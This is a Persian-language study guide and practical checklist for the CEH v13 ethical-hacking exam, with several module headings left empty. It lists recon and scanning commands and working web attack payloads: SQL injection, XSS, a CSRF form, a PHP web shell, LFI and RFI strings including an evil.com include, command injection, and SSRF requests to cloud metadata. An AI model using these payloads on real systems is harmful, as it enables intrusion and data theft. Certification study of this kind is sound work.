# CEH - V13


مهم‌ترین مفاهیم و آنچه باید بسیار مسلط باشی

این‌ها موضوعاتی‌اند که اگر بخوای در آزمون CEH v13 و مخصوصاً در کار عملی در امنیت موفق باشی، باید خیلی خوب بفهمیشون:

Reconnaissance / Footprinting

ابزارها مثل whois, dig, nslookup, Shodan, Google Dorking

جمع‌آوری اطلاعات از DNS, SSL/TLS certificate, subdomain enumeration

Scanning & Enumeration

اسکن کردن شبکه‌ها (پورت، سرویس، ورژن) با ابزارهایی مثل Nmap، Nessus، OpenVAS

Enumeration کاربران، سرویس‌ها، فایل‌های به اشتراک گذاشته شده

System Hacking

تکنیک‌های دسترسی به سیستم: Exploitation of vulnerabilities

Crack کردن پسوردها، حملات Brute-Force، استفاده از tools مثل John the Ripper یا Hashcat

افزایش سطح دسترسی (Privilege Escalation)

Web Application Hacking

SQL Injection (انواع: error-based, union, blind)

XSS (Reflected, Stored, DOM)

CSRF, File Inclusion, Remote File Inclusion (RFI), Local File Inclusion (LFI)

Session Management و کنترل دسترسی (IDOR / Broken Access Control)

Network & Perimeter Security

Sniffing / Packet Capture

فایروال‌ها، IDS/IPS و روش‌های عبور از آن‌ها

حملات DoS / DDoS

Social Engineering (Phishing, Tailgating)

IoT / Cloud / Mobile Security

مسائل امنیتی در Cloud (misconfigurations, IAM)

امنیت دستگاه‌های IoT / OT

امنیت اپلیکیشن موبایل، تهدیدات روی Android / iOS

Cryptography

مفاهیم کلید عمومی/ خصوصی، الگوریتم‌ها، hashها

حملاتی مثل Man-in-the-Middle، SSL/TLS weak ciphers

Covering Tracks & Maintaining Access

persistence، rootkits

log tampering

پاک‌سازی ردپاها


============================================================




 ✅ CEH v13 Practical Checklist – Web & Network

## 1. Reconnaissance (جمع‌آوری اطلاعات)
- [ ] بررسی دامنه و ساب‌دامین‌ها  
  - ابزار: `subfinder`, `assetfinder`, `amass`  
  - Example: `subfinder -d target.com -o subs.txt`

- [ ] DNS / WHOIS / SSL  
  - `whois target.com`  
  - `dig any target.com`  
  - SSL certificate → subdomains leak  

- [ ] Google Dorking  
  - `site:target.com filetype:pdf`  
  - `inurl:admin site:target.com`  

---

## 2. Scanning & Enumeration (اسکن و شناسایی)
- [ ] پورت‌ها و سرویس‌ها  
  - `nmap -sV -p- target.com`  

- [ ] Enumerate Web Tech  
  - ابزار: `wappalyzer`, `whatweb`, `builtwith`  

- [ ] Enumerate APIs  
  - `gau target.com | grep -i api`  
  - Common endpoints:
    - `/api/v1/users`
    - `/api/v1/orders`
    - `/api/auth/login`

---

## 3. Vulnerability Assessment (آسیب‌پذیری‌ها)

### 🔹 SQL Injection
- تست روی پارامترها: `id`, `user`, `order`, `pid`  
- Example endpoint: `/api/v1/orders?id=123`  
- Payloads:
  - `' OR '1'='1`  
  - `1 UNION SELECT null,@@version--`  
  - `1' AND SLEEP(5)--`  

---

### 🔹 XSS (Cross-Site Scripting)
- پارامترها: `q`, `search`, `message`, `comment`, `redirect`  
- Payloads:
  - `<script>alert(1)</script>`  
  - `"><img src=x onerror=alert(1)>`  
  - `<svg/onload=alert(document.domain)>`

---

### 🔹 IDOR (Insecure Direct Object Reference)
- Endpoint: `/api/v1/user/123/profile`  
- Test: تغییر ID → `124`, `125`, `999`  
- اگر دیتا بدون مجوز برگرده ⇒ **P1**  

---

### 🔹 CSRF (Cross-Site Request Forgery)
- Endpoint: `/api/v1/settings/email`  
- Payload (malicious form):
  ```html
  <form action="https://target.com/api/v1/settings/email" method="POST">
    <input type="hidden" name="email" value="attacker@mail.com">
    <input type="submit">
  </form>

File Upload

Endpoint: /api/v1/upload

تست فایل مخرب:

shell.php → <?php system($_GET['cmd']); ?>

test.jpg with polyglot payload

🔹 LFI / RFI (File Inclusion)

Endpoint: /download?file=report.pdf

Payloads:

../../../../etc/passwd

php://filter/convert.base64-encode/resource=index.php

http://evil.com/shell.txt

🔹 Command Injection

Endpoint: /ping?ip=127.0.0.1

Payloads:

127.0.0.1; whoami

127.0.0.1 && id

🔹 SSRF (Server-Side Request Forgery)

Endpoint: /fetch?url=http://target.com/page

Payloads:

http://127.0.0.1:22

http://169.254.169.254/latest/meta-data/

http://burp-collaborator-server.com/

4. Post-Exploitation

 Password reuse تست شود

 بررسی JWT / session tokens

Decode JWT → modify role: admin

 Log tampering / privilege escalation

5. Tools Integration

Burp Suite Extensions:

Logger++ → مانیتورینگ ریکوئست‌ها

Autorize → تست BOLA/IDOR

ActiveScan++ → اسکن خودکار پیشرفته

Turbo Intruder → brute force سنگین

Collaborator → تست SSRF/XSS Blind

🎯 Quick Reference Payloads

SQLi: ' OR '1'='1 --

XSS: <img src=x onerror=alert(1)>

LFI: ../../../../etc/passwd

SSRF: http://169.254.169.254/

Command Injection: 127.0.0.1; whoami



=============================================================
=============================================================

## module 01 = introduction

http://nvd.nist.gov
www.securitytracker.com
www.microsoft.com/security
www.securiteam.com
www.packetstormsecurity.com
www.hackerstorm.com
www.hackerwatch.org
www.securityfocous.com
www.securitymagazine.com
www.milworm.com


## module 02 = footprinting and reconnaissance









module 03









## module 04









## module 05









## module 06









## module 07









## module 08













